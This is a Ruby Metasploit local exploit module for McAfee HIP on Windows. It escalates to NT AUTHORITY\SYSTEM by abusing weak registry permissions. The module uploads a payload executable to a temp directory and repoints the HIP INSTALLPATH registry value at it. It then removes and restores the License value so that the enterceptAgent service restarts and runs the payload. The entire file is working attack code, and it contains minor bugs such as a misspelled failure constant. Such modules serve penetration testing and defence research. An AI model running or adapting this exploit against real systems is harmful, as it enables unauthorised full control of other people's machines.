##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/post/windows/services'

class Metasploit4 < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Exploit::EXE
  include Post::File
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Services

   def initialize(info = {})
    super(update_info(info,
      'Name'           => 'McAfee HIP privilege escalation',
      'Description'    => %q{
        This module abuse weak registry permissions in order to 
        escalate privileges to NT AUTHORITY\SYSTEM
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Donny Maasland <donny.maasland[at]fox-it.com>',
        ],
      'Platform'       => [ 'win' ],
      'SessionTypes'   => [ 'meterpreter', 'cmd' ],
      'Targets'        =>
        [
          [ 'Automatic', { 'Arch' => [ ARCH_X86, ARCH_X86_64 ] } ]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => "Jul 1 2015"
    ))
    
    register_options([
      OptInt.new('TIMEOUT',
        [true, 'Time to wait for service to stop and start in seconds.', '300']),
      OptString.new('PAYLOAD_DIR',
        [false, 'The directory to store the payload in. (Default: random)' ]),
    ], self.class)
  end

  def get_orig()
    installpath_orig = registry_getvaldata('HKLM\SOFTWARE\McAfee\HIP', 'INSTALLPATH', REGISTRY_VIEW_32_BIT)    
    unless installpath_orig
      fail_with(Failure::Unknown,'Failed to retrieve "INSTALLPATH" key value.')
    end

    license_orig = registry_getvaldata('HKLM\SOFTWARE\McAfee\HIP', 'License', REGISTRY_VIEW_32_BIT)    
    unless installpath_orig
      fail_with(Failure::Unknown,'Failed to retrieve "License" key value.')
    end
    print_status("Original license key is #{license_orig.each_byte.map { |b| b.to_s(16) }.join}")

    return installpath_orig, license_orig
  end

  def get_payload_dir()
    return datastore['PAYLOAD_DIR'] || expand_path("%TEMP%\\#{Rex::Text.rand_text_alphanumeric(8)}")
  end

  def check_payload_dir(payload_dir)
    unless client.fs.file.exists?(payload_dir)
      print_status("Creating directory #{payload_dir}")
      client.fs.dir.mkdir(payload_dir)
      unless client.fs.file.exists?(payload_dir)
        fail_with(Failure::Unkonwn, 'Failed to create directory')
      end
      print_good('Created directory')
      return
    end
      print_status("Directory #{payload_dir} exists")
  end

  def upload_payload(payload_dir)
    payload = generate_payload_exe
    path = "#{payload_dir}\\Helper.exe"
    print_status("Uploading payload (#{payload.length} bytes)")
    unless write_file(path, payload)
      fail_with(Failure::Unknown, 'Failed to upload payload')
    end
    print_good("Uploaded payload")
  end

  def break_hip(payload_dir, license_orig, license_temp)
    print_status('Removing "License" key to force stop HIP service')
    registry_setvaldata('HKLM\SOFTWARE\McAfee\HIP', 'INSTALLPATH', payload_dir, 'REG_SZ', REGISTRY_VIEW_32_BIT)
    registry_setvaldata('HKLM\SOFTWARE\McAfee\HIP', license_temp, license_orig, 'REG_BINARY', REGISTRY_VIEW_32_BIT)
    registry_deleteval('HKLM\SOFTWARE\McAfee\HIP', 'License', REGISTRY_VIEW_32_BIT)
    ::Timeout.timeout(datastore['TIMEOUT']) do
        until service_status('enterceptAgent')[:state] == 1
          sleep(1)
        end
    end
    print_good('Service stopped!')
    sleep(5)
  end

  def exploit_hip(license_orig, license_temp, installpath_orig)
    print_status('Attempting to launch payload')
    registry_setvaldata('HKLM\SOFTWARE\McAfee\HIP', 'License', license_orig, 'REG_BINARY', REGISTRY_VIEW_32_BIT)
    registry_deleteval('HKLM\SOFTWARE\McAfee\HIP', license_temp, REGISTRY_VIEW_32_BIT)
    begin
      ::Timeout.timeout(datastore['TIMEOUT']) do
          until service_status('enterceptAgent')[:state] == 4
            sleep(1)
          end
        end
      print_good('Service started, session should open')
      print_status('Waiting 15 seconds before continuing with cleanup') # Makes the exploit more reliable
      sleep(15)
    rescue Timeout::Error
      print_error('Service did not start on time, try a larger TIMEOUT value or consider using REBOOT method')
    end
  end

  def fix_hip(installpath_orig, license_orig)
    print_status('Restoring original HIP service')
    registry_setvaldata('HKLM\SOFTWARE\McAfee\HIP', 'INSTALLPATH', installpath_orig, 'REG_SZ', REGISTRY_VIEW_32_BIT)
    registry_setvaldata('HKLM\SOFTWARE\McAfee\HIP', 'License', license_orig, 'REG_BINARY', REGISTRY_VIEW_32_BIT)
  end

  def exploit()
    installpath_orig, license_orig = get_orig()
    payload_dir = get_payload_dir()
    check_payload_dir(payload_dir)
    upload_payload(payload_dir)
    license_temp = Rex::Text.rand_text_alphanumeric(8)
    break_hip(payload_dir, license_orig, license_temp)
    exploit_hip(license_orig, license_temp, installpath_orig)
    fix_hip(installpath_orig, license_orig)
  end
end 
